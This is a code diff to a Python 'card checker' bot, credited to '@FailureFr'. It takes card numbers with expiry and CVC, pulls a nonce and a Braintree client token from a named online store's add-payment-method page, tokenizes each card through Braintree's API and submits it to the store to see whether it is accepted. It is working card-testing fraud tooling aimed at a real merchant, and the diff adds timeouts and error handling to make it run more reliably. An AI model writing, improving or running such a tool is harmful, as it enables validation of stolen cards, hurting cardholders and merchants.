@@ -146,7 +146,7 @@ def check_card(cc_line):
     try:
         domain_url = "https://www.calipercovers.com"
         
-        # Get fresh authorization tokens
+        # Get fresh authorization tokens with proper timeouts
         headers_get = headers.copy()
         headers_get['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
         headers_get['referer'] = f'{domain_url}/my-account/payment-methods/'
@@ -155,7 +155,8 @@ def check_card(cc_line):
             f'{domain_url}/my-account/add-payment-method/',
             cookies=cookies,
             headers=headers_get,
-            verify=False
+            verify=False,
+            timeout=10  # 10 second timeout
         )
         
         if response.status_code == 200:
@@ -164,7 +165,7 @@ def check_card(cc_line):
             if not add_nonce:
                 end_time = time.time()
                 elapsed_time = end_time - start_time
-                return {"status": "DECLINED", "response": f"Failed to get nonce (Time: {elapsed_time:.2f}s)"}
+                return {"status": "DECLINED", "response": "Failed to get nonce"}
 
             # Get authorization token
             i0 = response.text.find('wc_braintree_client_token = ["')
@@ -177,20 +178,24 @@ def check_card(cc_line):
                     if not au:
                         end_time = time.time()
                         elapsed_time = end_time - start_time
-                        return {"status": "DECLINED", "response": f"Failed to get authorization (Time: {elapsed_time:.2f}s)"}
+                        return {"status": "DECLINED", "response": "Failed to get authorization"}
                     au = au[0]
                 except Exception as e:
                     end_time = time.time()
                     elapsed_time = end_time - start_time
-                    return {"status": "DECLINED", "response": f"Error decoding token: {str(e)} (Time: {elapsed_time:.2f}s)"}
+                    return {"status": "DECLINED", "response": f"Error decoding token: {str(e)}"}
             else:
                 end_time = time.time()
                 elapsed_time = end_time - start_time
-                return {"status": "DECLINED", "response": f"Client token not found (Time: {elapsed_time:.2f}s)"}
+                return {"status": "DECLINED", "response": "Client token not found"}
+        elif response.status_code == 503:
+            end_time = time.time()
+            elapsed_time = end_time - start_time
+            return {"status": "DECLINED", "response": "Service temporarily unavailable (503)"}
         else:
             end_time = time.time()
             elapsed_time = end_time - start_time
-            return {"status": "DECLINED", "response": f"Failed to fetch payment page, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}
+            return {"status": "DECLINED", "response": f"Failed to fetch payment page, status code: {response.status_code}"}
 
         n, mm, yy, cvc = cc_line.strip().split('|')
         if not yy.startswith('20'):
@@ -238,7 +243,8 @@ def check_card(cc_line):
             'https://payments.braintree-api.com/graphql',
             headers=headers_token,
             json=json_data,
-            verify=False
+            verify=False,
+            timeout=15  # 15 second timeout
         )
 
         end_time = time.time()
@@ -269,7 +275,8 @@ def check_card(cc_line):
                         cookies=cookies,
                         headers=headers_submit,
                         data=data,
-                        verify=False
+                        verify=False,
+                        timeout=20  # 20 second timeout
                     )
 
                     end_time = time.time()
@@ -299,17 +306,25 @@ Bot By: @FailureFr
 
                         return {"status": status, "response": reason}
                     else:
-                        return {"status": "DECLINED", "response": f"Payment submission failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}
+                        return {"status": "DECLINED", "response": f"Payment submission failed, status code: {response.status_code}"}
                 else:
-                    return {"status": "DECLINED", "response": f"Invalid or missing token data (Time: {elapsed_time:.2f}s)"}
+                    return {"status": "DECLINED", "response": "Invalid or missing token data"}
             except ValueError as e:
-                return {"status": "DECLINED", "response": f"Invalid JSON response: {str(e)} (Time: {elapsed_time:.2f}s)"}
+                return {"status": "DECLINED", "response": f"Invalid JSON response: {str(e)}"}
         else:
-            return {"status": "DECLINED", "response": f"Tokenization failed, status code: {response.status_code} (Time: {elapsed_time:.2f}s)"}
+            return {"status": "DECLINED", "response": f"Tokenization failed, status code: {response.status_code}"}
+    except requests.exceptions.Timeout:
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        return {"status": "DECLINED", "response": "Request timeout"}
+    except requests.exceptions.RequestException as e:
+        end_time = time.time()
+        elapsed_time = end_time - start_time
+        return {"status": "DECLINED", "response": f"Request error: {str(e)}"}
     except Exception as e:
         end_time = time.time()
         elapsed_time = end_time - start_time
-        return {"status": "DECLINED", "response": f"Error: {str(e)} (Time: {elapsed_time:.2f}s)"}
+        return {"status": "DECLINED", "response": f"Error: {str(e)}"}
 
 # Initialize Flask app
 app = Flask(__name__)
